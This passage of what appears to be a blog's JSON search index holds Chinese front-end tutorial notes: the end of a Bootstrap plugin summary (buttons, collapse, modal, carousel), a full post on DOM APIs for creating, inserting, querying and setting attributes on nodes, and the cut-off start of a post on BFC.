\u0026lt;input type=\u0026quot;radio\u0026quot; name=\u0026quot;sex\u0026quot; autocomplete=\u0026quot;off\u0026quot; checked\u0026gt; 男 \u0026lt;/label\u0026gt; \u0026lt;label for=\u0026quot;\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;radio\u0026quot; name=\u0026quot;sex\u0026quot; autocomplete=\u0026quot;off\u0026quot;\u0026gt; 女 \u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt;   复选按钮  \u0026lt;div class=\u0026quot;btn-group\u0026quot; data-toggle=\u0026quot;buttons\u0026quot;\u0026gt; \u0026lt;label for=\u0026quot;\u0026quot; class=\u0026quot;btn btn-primary active\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot; name=\u0026quot;fa\u0026quot; autocomplete=\u0026quot;off\u0026quot; checked\u0026gt; 音乐 \u0026lt;/label\u0026gt; \u0026lt;label for=\u0026quot;\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot; name=\u0026quot;fa\u0026quot; autocomplete=\u0026quot;off\u0026quot;\u0026gt; 体育 \u0026lt;/label\u0026gt; \u0026lt;label for=\u0026quot;\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot; name=\u0026quot;fa\u0026quot; autocomplete=\u0026quot;off\u0026quot;\u0026gt; 美术 \u0026lt;/label\u0026gt; \u0026lt;label for=\u0026quot;\u0026quot; class=\u0026quot;btn btn-primary\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;checkbox\u0026quot; name=\u0026quot;fa\u0026quot; autocomplete=\u0026quot;off\u0026quot;\u0026gt; 电脑 \u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt;   加载状态  \u0026lt;button id=\u0026quot;myButton\u0026quot; type=\u0026quot;button\u0026quot; data-loading-text=\u0026quot;Loading...\u0026quot; class=\u0026quot;btn btn-primary\u0026quot; autocomplete=\u0026quot;off\u0026quot;\u0026gt; 加载状态 \u0026lt;/button\u0026gt;  $('#myButton').on('click', function () { var btn = $(this).button('loading'); setTimeout(function () { btn.button('reset'); }, 1000); });   Button 插件中的 button 方法中有三个参数：toggle、reset、string(比如 loading、 complete)。 可代替 data-toggle=\u0026quot;button\u0026quot;  $('button').on('click', function () { $(this).button('toggle'); });  折叠插件\n 基本实例  \u0026lt;button class=\u0026quot;btn btn-primary\u0026quot; data-toggle=\u0026quot;collapse\u0026quot; data-target=\u0026quot;#content\u0026quot;\u0026gt; Bootstrap \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026quot;collapse\u0026quot; id=\u0026quot;content\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;well\u0026quot;\u0026gt; Bootstrap 是 Twitter 推出的一个用于前端开发的开源工具包。它由 Twitter 的设计师 Mark Otto 和 Jacob Thornton 合作开发,是一个 CSS/HTML 框架。目 前,Bootstrap 最新版本为 3.0 。 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;   Collapse插件的方法：hide、show、toggle  $('button').on('click', function () { $('#collapseOne').collapse('toggle'); });   Collapse插件的事件：  show.bs.collapse 在 show 方法调用时立即触发 shown.bs.collapse 折叠区完全显示出来是触发 hide.bs.collapse 在 hide 方法调用时触发 hidden.bs.collapse 该事件在折叠区域完全隐藏之后触发    十二、模态框、轮播插件 模态框插件\n 模态框的弹窗组件需要三层 div 容器元素，分别为 modal(模态声明层)、 dialog(窗口声明层)、content(内容层) 在内容层里面，还有三层，分别为 header(头部)、body(主体)、footer(注脚) 模态框去掉 show，增加一个 id  \u0026lt;div class=\u0026quot;modal\u0026quot; id=\u0026quot;myModal\u0026quot;\u0026gt; \u0026lt;!-- 点击触发模态框显示 --\u0026gt; \u0026lt;button class=\u0026quot;btn btn-primary btn-lg\u0026quot; data-toggle=\u0026quot;modal\u0026quot; data-target=\u0026quot;#myModal\u0026quot;\u0026gt; 点击弹窗 \u0026lt;/button\u0026gt; \u0026lt;!-- 弹窗的大小有三种，默认情况下是正常，还有 lg(大)和 sm(小) --\u0026gt; \u0026lt;div class=\u0026quot;modal-dialog modal-lg\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;modal-dialog sm-lg\u0026quot;\u0026gt; \u0026lt;!-- 可设置淡入淡出效果 --\u0026gt; \u0026lt;div class=\u0026quot;modal fade\u0026quot; id=\u0026quot;myModal\u0026quot;\u0026gt;   所有的插件，都是基于 JavaScript/jQuery 的。 四个要素：用法、参数、方法和事件。\n 用法\n 可以通过 data 属性 data-toggle data-toggle=\u0026quot;modal\u0026quot; data-target=\u0026quot;#myModal\u0026quot; data-toggle 表示触发类型 data-target 表示触发的节点 如果不是使用\u0026lt;button\u0026gt;，而是\u0026lt;a\u0026gt;，其中 data-target 也可以使用 href=\u0026quot;#myModal\u0026quot;取代 建议使用 data-target。除了 data-toggle 和 data-target 两个声明 属性外，还有一些可以用选项  参数\n data-backdrop 布尔值或 'static' 默认值 true，表示背景存在黑灰透明 遮罩，且单击空白背景可关闭弹窗； 如果为 false，表示背景不存在黑灰 透明遮罩，且点击空白背景不可关闭 弹窗； 如果是字符串'static'，表示背景存 在黑灰透明遮罩，且点击空白不可关 闭弹窗。 data-keyboard 布尔值 true 如果是 true，按 esc 键会关闭窗口； 如果是 false，按 esc 键会不会关闭。 data-show 布尔值 true 如果是 true，初始化时，默认显示； 如果是 false，初始化时，默认隐藏。 remote url 路径 空值 如果值不是以#号开头，则表示一个 url 地址，加载 url 内容到 modal-content 容器里，并只加载一 次。 如果是#号，就是取代 data-target 的方法。 在 JavaScript 直接设置 通过 jQuery 方式声明   $('#myModal').modal({ show : true, backdrop : false, keyboard : false, remote : 'index.html' });   方法  toggle .modal('toggle'); 触发时，反转切换弹窗状态 show .modal('show'); 触发时，显示弹窗 hide .modal('hide'); 触发时，关闭弹窗 点击显示弹窗 javascript $('#btn').on('click', function () { $('#myModal').modal('show'); }); $('#myModal').modal({ show : false, });    事件\n show.bs.modal 在show 方法调用时立即触发。 shown.bs.modal 在模态框完全显示出来，并且等 CSS 动画完成之后触 发。 hide.bs.modal 在 hide 方法调用时，但还未关闭隐藏时触发。 hidden.bs.modal 在模态框完全隐藏之后，并且等 CSS 动画完成之后触 发  $('#myModal').on('show.bs.modal', function () { alert('在 show 方法调用时立即触发！'); }); $('#myModal').on('loaded.bs.modal', function () { alert('远程数据加载完毕后触发！'); });  轮播图插件\n data 属性解释：  data-slide 接受关键字 prev 或 next，用来改变幻灯片相对于当前位置的位置； data-slide-to 来向轮播底部创建一个原始滑动索引，data-slide-to=\u0026quot;2\u0026quot;将把滑 动块移动到一个特定的索引，索引从 0 开始计数。 data-ride=\u0026quot;carousel\u0026quot;属性用户标记轮播在页面加载时开始动画播放。 data-interval 默认值 5000，幻灯片的等待时间(毫秒)。如果为 false，轮播将不会自动开始循环。 data-pause 默认鼠标停留在幻灯片区域(hover)即暂停轮播，鼠 标离开即启动轮播。 data-wrap 默认值 true，轮播是否持续循环。 如果在 JavaScript 调用就直接使用键值对方法，并去掉 data-；   $('#myCarousel').carousel({ //设置自定义属性 interval : 2000,//设置自动播放`/2` 秒 pause : 'hover',//设置暂停按钮的事件 wrap : false, //只播一次 });   方法：  cycle 循环各帧(默认从左到右) pause 停止轮播 number 轮播到指定的图片上(小标从 0 开始，类似数组) prev 循环轮播到上一个项目 next 循环轮播到下一个项目   $('button').on('click', function () {//点击按钮执行 $('#myCarousel').carousel('cycle'); //点击后，自动播放 }   事件\n slide.bs.carousel 当调用 slide 实例方式时立即触发该事件。\n slid.bs.carousel 当轮播完成一个幻灯片触发该事件\n  $('#myCarousel').on('slide.bs.carousel', function () { alert('当调用 slide 实例方式时立即触发'); }); $('#myCarousel').on('slid.bs.carousel', function () { alert('当轮播完成一个幻灯片触发'); });   bootstrap笔记总结【复制到浏览器打开放大】   拓展阅读  bootstrap中文教程 Examples · Bootstrap-4.0 bootstrap很方便的速查表-推荐 ","permalink":"http://localhost:8000/public/post/bootstrap-review/","tags":["Bootstrap"],"title":"bootstrap笔记总结"},{"categories":["Front-End","搬运整理"],"contents":" 原文 链接\n 一、基本类型介绍 1.1 Node类型  DOM1级定义了一个Node接口，该接口由DOM中所有节点类型实现。这个Node接口在JS中是作为Node类型实现的。在IE9以下版本无法访问到这个类型，JS中所有节点都继承自Node类型，都共享着相同的基本属性和方法 Node有一个属性nodeType表示Node的类型，它是一个整数，其数值分别表示相应的Node类型    假设我们要判断一个Node是不是元素，我们可以这样判断  if(someNode.nodeType == 1){ console.log(\u0026quot;Node is a element\u0026quot;); }   这些Node类型中，我们最常用的就是element，text，attribute，comment，document，document_fragment这几种类型  1.2 Element类型  Element提供了对元素标签名，子节点和特性的访问，我们常用HTML元素比如div，span，a等标签就是element中的一种。 Element有下面几条特性：\n nodeType为1 nodeName为元素标签名，tagName也是返回标签名 nodeValue为null parentNode可能是Document或Element 子节点可能是 Element，Text，Comment，Processing_Instruction，CDATASection 或 EntityReference   1.3 Text类型  Text表示文本节点，它包含的是纯文本内容，不能包含html代码，但可以包含转义后的html代码。Text有下面的特性：  nodeType为3 nodeName为#text nodeValue为文本内容 parentNode是一个Element 没有子节点   1.4 Attr类型  Attr类型表示元素的特性，相当于元素的attributes属性中的节点，它有下面的特性：  nodeType值为2 nodeName是特性的名称 nodeValue是特性的值 parentNode为null   1.5 Comment类型  Comment表示HTML文档中的注释，它有下面的几种特征：  nodeType为8 nodeName为#comment nodeValue为注释的内容 parentNode可能是Document或Element 没有子节点   1.6 Document  Document表示文档，在浏览器中，document对象是HTMLDocument的一个实例，表示整个页面，它同时也是window对象的一个属性。Document有下面的特性：  nodeType为9 nodeName为#document nodeValue为 null parentNode为 null 子节点可能是一个DocumentType或Element   1.7 DocumentFragment类型  DocumentFragment是所有节点中唯一一个没有对应标记的类型，它表示一种轻量级的文档，可能当作一个临时的仓库用来保存可能会添加到文档中的节点。DocumentFragment有下面的特性：\n nodeType为11 nodeName为#document-fragment nodeValue为null parentNode为null  我们简单地介绍了几种常见的Node类型，要记住，HTML中的节点并不只是包括元素节点，它还包括文本节点，注释节点等等。在这里我们只是简单地说明了几种常见的节点.\n  二、 DOM提供的几个属性 2.1 childNodes属性  在一棵节点树上，childNodes属性可以用来获取任何一个元素的所有子节点，它是一个包含这个元素全部子元素的数组  element.childNodes  2.2 nodeType属性  节点之间的关系构成了节点层次，html 页面的可以画出一个以html标签为根节点的树形结构 DOM 会把文档看作是一棵树，同时定义了很多方法来操作这棵数中的每一个元素（节点）  \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hello world!!!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   每一个节点都有nodeType属性  node.nodeType   nodeType属性总共有12中可能取值，但其中仅有3种有实用价值  元素节点的nodeType属性值是1 属性节点的nodeType属性值是2 文本节点的nodeType属性值是3   description.firstChild.nodeValue = text;  2.3 nodeValue属性  nodeValue属性  如果想改变一个文本节点的值，那就使用DOM提供的nodeValue,它用来得到一个节点的值 node.nodeValue 需要注意：nodeValue属性获取对象的值时，得到的并不是包含在这个段落里的文本 nodeValue属性不仅可以用来检测节点的值，还可以设置节点的值   2.4 firstChild和lastChild属性  数组元素childNodes[0]有个更直观的同义词。无论如何，只要访问childNodes数组的第一个元素，都可以把它写成firstChild  node.firstChild  与下面等价\nnode.childNodes[0]   DOM还提供了一个与之对应的lastChild属性  node.lastChild  ### 三、节点创建型API\n 在这里，我将常用的DOM操作api进行分类，首先要介绍的是创建型的api。这一类型的api，简而言之就是用来创建节点的  3.1 createElement  createElement通过传入指定的一个标签名来创建一个元素，如果传入的标签名是一个未知的，则会创建一个自定义的标签，注意：IE8以下浏览器不支持自定义标签  var div = document.createElement(\u0026quot;div\u0026quot;);   使用createElement要注意：通过createElement创建的元素并不属于html文档，它只是创建出来，并未添加到html文档中，要调用appendChild或insertBefore等方法将其添加到HTML文档树中  3.2 createTextNode  createTextNode用来创建一个文本节点，用法如下  var textNode = document.createTextNode(\u0026quot;一个TextNode\u0026quot;);   createTextNode接收一个参数，这个参数就是文本节点中的文本，和createElement一样，创建后的文本节点也只是独立的一个节点，同样需要appendChild将其添加到HTML文档树中  3.3 cloneNode  cloneNode是用来返回调用方法的节点的一个副本，它接收一个bool参数，用来表示是否复制子元素，使用如下：  var parent = document.getElementById(\u0026quot;parentElement\u0026quot;); var parent2 = parent.cloneNode(true);// 传入true parent2.id = \u0026quot;parent2\u0026quot;;   这段代码通过cloneNode复制了一份parent元素，其中cloneNode的参数为true，表示parent的子节点也被复制，如果传入false，则表示只复制了parent节点  \u0026lt;div id=\u0026quot;parent\u0026quot;\u0026gt; 我是父元素的文本 \u0026lt;br/\u0026gt; \u0026lt;span\u0026gt; 我是子元素 \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button id=\u0026quot;btnCopy\u0026quot;\u0026gt;复制\u0026lt;/button\u0026gt; var parent = document.getElementById(\u0026quot;parent\u0026quot;); document.getElementById(\u0026quot;btnCopy\u0026quot;).onclick = function(){ var parent2 = parent.cloneNode(true); parent2.id = \u0026quot;parent2\u0026quot;; document.body.appendChild(parent2); }   这段代码很简单，主要是绑定button事件，事件内容是复制了一个parent，修改其id，然后添加到文档中\n 这里有几点要注意：\n 和createElement一样，cloneNode创建的节点只是游离有html文档外的节点，要调用appendChild方法才能添加到文档树中 如果复制的元素有id，则其副本同样会包含该id，由于id具有唯一性，所以在复制节点后必须要修改其id 调用接收的bool参数最好传入，如果不传入该参数，不同浏览器对其默认值的处理可能不同  除此之外，我们还有一个需要注意的点：\n 如果被复制的节点绑定了事件，则副本也会跟着绑定该事件吗？这里要分情况讨论：  如果是通过addEventListener或者比如onclick进行绑定事件，则副本节点不会绑定该事件 如果是内联方式绑定比如    \u0026lt;div onclick=\u0026quot;showParent()\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;   这样的话，副本节点同样会触发事件  3.4 createDocumentFragment  createDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中\n createDocumentFragment方法主要是用于添加大量节点到文档中时会使用到。假设要循环一组数据，然后创建多个节点添加到文档中\n  \u0026lt;ul id=\u0026quot;list\u0026quot;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;添加多项\u0026quot; id=\u0026quot;btnAdd\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnAdd\u0026quot;).onclick = function(){ var list = document.getElementById(\u0026quot;list\u0026quot;); for(var i = 0;i \u0026lt; 100; i++){ var li = document.createElement(\u0026quot;li\u0026quot;); li.textContent = i; list.appendChild(li); } }   这段代码将按钮绑定了一个事件，这个事件创建了100个li节点，然后依次将其添加HTML文档中。这样做有一个缺点：每次一创建一个新的元素，然后添加到文档树中，这个过程会造成浏览器的回流。所谓回流简单说就是指元素大小和位置会被重新计算，如果添加的元素太多，会造成性能问题。这个时候，就是使用createDocumentFragment了\n DocumentFragment不是文档树的一部分，它是保存在内存中的，所以不会造成回流问题。我们修改上面的代码如下\n  document.getElementById(\u0026quot;btnAdd\u0026quot;).onclick = function(){ var list = document.getElementById(\u0026quot;list\u0026quot;);\tvar fragment = document.createDocumentFragment(); for(var i = 0;i \u0026lt; 100; i++){ var li = document.createElement(\u0026quot;li\u0026quot;); li.textContent = i; fragment.appendChild(li); } list.appendChild(fragment); }   优化后的代码主要是创建了一个fragment，每次生成的li节点先添加到fragment，最后一次性添加到list  3.5 创建型API总结  创建型api主要包括createElement，createTextNode，cloneNode和createDocumentFragment四个方法，需要注意下面几点：\n 它们创建的节点只是一个孤立的节点，要通过appendChild添加到文档中 cloneNode要注意如果被复制的节点是否包含子节点以及事件绑定等问题 使用createDocumentFragment来解决添加大量节点时的性能问题   四、页面修改型API  前面我们提到创建型api，它们只是创建节点，并没有真正修改到页面内容，而是要调用appendChild来将其添加到文档树中。我在这里将这类会修改到页面内容归为一类。 修改页面内容的api主要包括：appendChild，insertBefore，removeChild，replaceChild  4.1 appendChild  appendChild我们在前面已经用到多次，就是将指定的节点添加到调用该方法的节点的子元素的末尾。调用方法如下：  parent.appendChild(child);   child节点将会作为parent节点的最后一个子节点\n appendChild这个方法很简单，但是还有有一点需要注意：如果被添加的节点是一个页面中存在的节点，则执行后这个节点将会添加到指定位置，其原本所在的位置将移除该节点，也就是说不会同时存在两个该节点在页面上，相当于把这个节点移动到另一个地方\n  \u0026lt;div id=\u0026quot;child\u0026quot;\u0026gt; 要被添加的节点 \u0026lt;/div\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;div id=\u0026quot;parent\u0026quot;\u0026gt; 要移动的位置 \u0026lt;/div\u0026gt;\t\u0026lt;input id=\u0026quot;btnMove\u0026quot; type=\u0026quot;button\u0026quot; value=\u0026quot;移动节点\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnMove\u0026quot;).onclick = function(){ var child = document.getElementById(\u0026quot;child\u0026quot;); document.getElementById(\u0026quot;parent\u0026quot;).appendChild(child); }   这段代码主要是获取页面上的child节点，然后添加到指定位置，可以看到原本的child节点被移动到parent中了。 这里还有一个要注意的点：如果child绑定了事件，被移动时，它依然绑定着该事件  4.2 insertBefore  insertBefore用来添加一个节点到一个参照节点之前，用法如下  parentNode.insertBefore(newNode,refNode);   parentNode表示新节点被添加后的父节点 newNode表示要添加的节点 refNode表示参照节点，新节点会添加到这个节点之前  \u0026lt;div id=\u0026quot;parent\u0026quot;\u0026gt; 父节点 \u0026lt;div id=\u0026quot;child\u0026quot;\u0026gt;\t子元素 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;insertNode\u0026quot; value=\u0026quot;插入节点\u0026quot; /\u0026gt; var parent = document.getElementById(\u0026quot;parent\u0026quot;); var child = document.getElementById(\u0026quot;child\u0026quot;); document.getElementById(\u0026quot;insertNode\u0026quot;).onclick = function(){ var newNode = document.createElement(\u0026quot;div\u0026quot;); newNode.textContent = \u0026quot;新节点\u0026quot; parent.insertBefore(newNode,child); }   这段代码创建了一个新节点，然后添加到child节点之前 和appendChild一样，如果插入的节点是页面上的节点，则会移动该节点到指定位置，并且保留其绑定的事件。\n 关于第二个参数参照节点还有几个注意的地方：\n refNode是必传的，如果不传该参数会报错 如果refNode是undefined或null，则insertBefore会将节点添加到子元素的末尾   4.3 removeChild  removeChild顾名思义，就是删除指定的子节点并返回，用法如下  var deletedChild = parent.removeChild(node);   deletedChild指向被删除节点的引用，它等于node，被删除的节点仍然存在于内存中，可以对其进行下一步操作。\n 注意：如果被删除的节点不是其子节点，则程序将会报错。我们可以通过下面的方式来确保可以删除：\n  if(node.parentNode){ node.parentNode.removeChild(node); }   通过节点自己获取节点的父节点，然后将自身删除  4.4 replaceChild  replaceChild用于使用一个节点替换另一个节点，用法如下  parent.replaceChild(newChild,oldChild);   newChild是替换的节点，可以是新的节点，也可以是页面上的节点，如果是页面上的节点，则其将被转移到新的位置 oldChild是被替换的节点  4.5 页面修改型API总结  页面修改型api主要是这四个接口，要注意几个特点：  不管是新增还是替换节点，如果新增或替换的节点是原本存在页面上的，则其原来位置的节点将被移除，也就是说同一个节点不能存在于页面的多个位置 节点本身绑定的事件会不会消失，会一直保留着   五、节点查询型API  节点查询型API也是非常常用的  5.1 document.getElementById  这个接口很简单，根据元素id返回元素，返回值是Element类型，如果不存在该元素，则返回null\n 使用这个接口有几点要注意：\n 元素的Id是大小写敏感的，一定要写对元素的id HTML文档中可能存在多个id相同的元素，则返回第一个元素 只从文档中进行搜索元素，如果创建了一个元素并指定id，但并没有添加到文档中，则这个元素是不会被查找到的   5.2 document.getElementsByTagName  这个接口根据元素标签名获取元素，返回一个即时的HTMLCollection类型，什么是即时的HTMLCollection类型呢？  \u0026lt;div\u0026gt;div1\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;div2\u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;显示数量\u0026quot; id=\u0026quot;btnShowCount\u0026quot;/\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; value=\u0026quot;新增div\u0026quot; id=\u0026quot;btnAddDiv\u0026quot;/\u0026gt;\tvar divList = document.getElementsByTagName(\u0026quot;div\u0026quot;); document.getElementById(\u0026quot;btnAddDiv\u0026quot;).onclick = function(){ var div = document.createElement(\u0026quot;div\u0026quot;); div.textContent =\u0026quot;div\u0026quot; + (divList.length+1); document.body.appendChild(div); } document.getElementById(\u0026quot;btnShowCount\u0026quot;).onclick = function(){ alert(divList.length); }   这段代码中有两个按钮，一个按钮是显示HTMLCollection元素的个数，另一个按钮可以新增一个div标签到文档中。前面提到HTMLCollcetion元素是即时的表示该集合是随时变化的，也就是是文档中有几个div，它会随时进行变化，当我们新增一个div后，再访问HTMLCollection时，就会包含这个新增的div\n 使用document.getElementsByTagName这个方法有几点要注意：\n 如果要对HTMLCollection集合进行循环操作，最好将其长度缓存起来，因为每次循环都会去计算长度，暂时缓存起来可以提高效率 如果没有存在指定的标签，该接口返回的不是null，而是一个空的HTMLCollection “*”表示所有标签   5.3 document.getElementsByName  getElementsByName主要是通过指定的name属性来获取元素，它返回一个即时的NodeList对象。一般用于获取表单元素的·name·属性\n 使用这个接口主要要注意几点：\n 返回对象是一个即时的 NodeList，它是随时变化的 在HTML元素中，并不是所有元素都有name属性，比如 div 是没有 name 属性的，但是如果强制设置 div 的 name 属性，它也是可以被查找到的 在IE中，如果id设置成某个值，然后传入 getElementsByName 的参数值和 id 值一样，则这个元素是会被找到的，所以最好不好设置同样的值给 id 和 name    5.4 document.getElementsByClassName  这个API是根据元素的class返回一个即时的HTMLCollection，用法如下  var elements = document.getElementsByClassName(names);   这个接口有下面几点要注意：  返回结果是一个即时的HTMLCollection，会随时根据文档结构变化 IE9以下浏览器不支持 如果要获取2个以上classname，可传入多个classname，每个用空格相隔，例如    var elements = document.getElementsByClassName(\u0026quot;test1 test2\u0026quot;);  5.5 document.querySelector和document.querySelectorAll  这两个api很相似，通过css选择器来查找元素，注意选择器要符合CSS选择器的规则\n 首先来介绍一下document.querySelector\n document.querySelector返回第一个匹配的元素，如果没有匹配的元素，则返回null。\n 注意，由于返回的是第一个匹配的元素，这个api使用的深度优先搜索来获取元素\n  \u0026lt;div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span class=\u0026quot;test\u0026quot;\u0026gt;第三级的span\u0026lt;/span\u0026gt;\t\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;test\u0026quot;\u0026gt;\t同级的第二个div \u0026lt;/div\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; id=\u0026quot;btnGet\u0026quot; value=\u0026quot;获取test元素\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnGet\u0026quot;).addEventListener(\u0026quot;click\u0026quot;,function(){ var element = document.querySelector(\u0026quot;.test\u0026quot;); alert(element.textContent); })   这个例子很简单，就是两个class都包含“test”的元素，一个在文档树的前面，但是它在第三级，另一个在文档树的后面，但它在第一级，通过querySelector获取元素时，它通过深度优先搜索，拿到文档树前面的第三级的元素\n document.querySelectorAll的不同之处在于它返回的是所有匹配的元素，而且可以匹配多个选择符\n  \u0026lt;div class=\u0026quot;test\u0026quot;\u0026gt; class为test \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;test\u0026quot;\u0026gt; id为test \u0026lt;/div\u0026gt; \u0026lt;input id=\u0026quot;btnShow\u0026quot; type=\u0026quot;button\u0026quot; value=\u0026quot;显示内容\u0026quot; /\u0026gt; document.getElementById(\u0026quot;btnShow\u0026quot;).addEventListener(\u0026quot;click\u0026quot;,function(){ var elements = document.querySelectorAll(\u0026quot;#test,.test\u0026quot;);\tfor(var i = 0,length = elements.length;i\u0026lt;length;i++){ alert(elements[i].textContent); }\t})   这段代码通过querySelectorAll，使用id选择器和class选择器选择了两个元素，并依次输出其内容。要注意两点：\n querySelectorAll也是通过深度优先搜索，搜索的元素顺序和选择器的顺序无关 返回的是一个非即时的NodeList，也就是说结果不会随着文档树的变化而变化  兼容性问题：querySelector和querySelectorAll在ie8以下的浏览器不支持\n 小结：\n document.getElementById返回一个对象 document.getElementsByName和document.getElementsByClasName返回一个对象数组   六、节点关系型API  在html文档中的每个节点之间的关系都可以看成是家谱关系，包含父子关系，兄弟关系等等  6.1 父关系型API  parentNode：每个节点都有一个parentNode属性，它表示元素的父节点。Element的父节点可能是Element，Document或DocumentFragment parentElement：返回元素的父元素节点，与parentNode的区别在于，其父节点必须是一个Element，如果不是，则返回null  6.2 兄弟关系型API  previousSibling：节点的前一个节点，如果该节点是第一个节点，则为null。注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下 previousElementSibling：返回前一个元素节点，前一个节点必须是Element，注意IE9以下浏览器不支持\n nextSibling previousSibling 存在兼容性问题\n nextElementSibling previousElementSibling 推荐使用\n  \u0026lt;script\u0026gt; var oUl = document.getElementById('ul1'); var firstEle = oUl.firstElementChild; var lastEle = oUl.lastElementChild; firstEle.nextElementSibling.style.background = 'red'; lastEle.previousElementSibling.style.background = 'green'; \u0026lt;/script\u0026gt;   nextSibling：节点的后一个节点，如果该节点是最后一个节点，则为null。注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下 nextElementSibling：返回后一个元素节点，后一个节点必须是Element，注意IE9以下浏览器不支持  6.3 子关系型API  childNodes：  返回一个即时的NodeList，表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。childNodes子节点列表集合（只读属性 有兼容性问题 ）   \u0026lt;ul id=\u0026quot;ul1\u0026quot;\u0026gt; \u0026lt;li\u0026gt;11111\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;22222\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;3333\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;44444\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;script\u0026gt; var oUl = document.getElementById('ul1'); console.log(oUl.childNodes); \u0026lt;/script\u0026gt;   从截图中可以看出 这段代码中ul的子节点有9个，这说明使用childNodes获取的节点包括了文本节点和元素节点\n childNodes 在低版本的ie 浏览器下获取的节点只包括元素节点，这就导致了兼容性问题\n 如何解决兼容性？？\n 根据子节点的nodeType属性值判断   for (var i=0; i\u0026lt;oUl.childNodes.length; i++) { if ( oUl.childNodes[i].nodeType == 1 ) { oUl.childNodes[i].style.background = 'red'; } }   children：\n 一个即时的HTMLCollection，子节点都是Element，IE9以下浏览器不支持。children子节点列表集合（只读属性 推荐使用 ）  children 获取的子节点只包含元素节点\n  for (var i = 0; i\u0026lt;oUl.children.length; i++){ oUl.children[i].style.background = 'red'; }   firstNode：第一个子节点 lastNode：最后一个子节点\n firstChild （firstElementChild） lastChild(lastElementChild) 第一个子节点 最后一个子节点\n firstChild 、lastChild 和childNodes同样的存在兼容性问题，在低版本ie浏览器中只能获取到元素节点\n firstElementChild、 lastElementChild 获取第一个元素子节点，最后一个元素子节点 推荐使用\n  var oUl = document.getElementById('ul1'); // oUl.firstChild.style.background = 'red';//标准浏览器 报错 // oUl.lastChild.style.background = 'red';//标准浏览器 报错 oUl.firstElementChild.style.background = 'red'; oUl.lastElementChild.style.background = 'red';   hasChildNodes方法：可以用来判断是否包含子节点  七、元素属性型 7.1 setAttribute  setAttribute：它允许我们对元素属性值做出修改与getAttribute一样setAttribute也能用于元素节点 通过setAttribute对文档做出修改后，在通过浏览器的查看源码选项看到的任然是改变之前的属性值，也就是说setAttribue做出的修改，不会反应到文档本身的源码里 setAttribute优势在于可以修改文档中的任何一个属性  element.setAttribute(name, value);   其中name是特性名，value是特性值。如果元素不包含该特性，则会创建该特性并赋值。 如果元素本身包含指定的特性名为属性，则可以访问属性进行赋值，比如下面两条代码是等价  element.setAttribute(\u0026quot;id\u0026quot;,\u0026quot;test\u0026quot;); element.id = \u0026quot;test\u0026quot;;   非DOM的解决方案\n 其实不用setAttribute也可以改变元素的属性 setAttribute方法是第一级DOM的组成部分，它可以设计任何元素节点的任意属性。在第1级DOM出现之前，你可以通过另外一种办法设置大部分元素的属性   element.value = \u0026quot;the new value\u0026quot;;  与下面语句等价\nelement.setAttribute(\u0026quot;value\u0026quot;,\u0026quot;the new value\u0026quot;);  7.2 getAttribute  getAttribute返回指定的特性名相应的特性值，如果不存在，则返回null或空字符串。 getAttribute不属性doucment对象，不能通过document对象调用，只能通过元素节点对象调用 例如可以与getElementsByTagName方法合用，获取每个p的title属性  var paras = document.getElementsByTagName(\u0026quot;p\u0026quot;); for(var i=0;i\u0026lt;para.lenght;i++){ alert(paras.getAttrtitube(\u0026quot;title\u0026quot;)); }  八、表格操作 九、样式操作 十、大小和偏移 十一、网上的一张思维导图总结  参考  JavaScript DOM编程艺术 常用DOM操作    本文mardown原文件 ","permalink":"http://localhost:8000/public/post/dom%E7%BC%96%E7%A8%8B%E4%B9%8Bapi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E7%AF%87/","tags":["JavaScript","DOM"],"title":"DOM编程之API学习总结篇"},{"categories":["Front-End","搬运整理"],"contents":"BFC 是什么？  BFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC 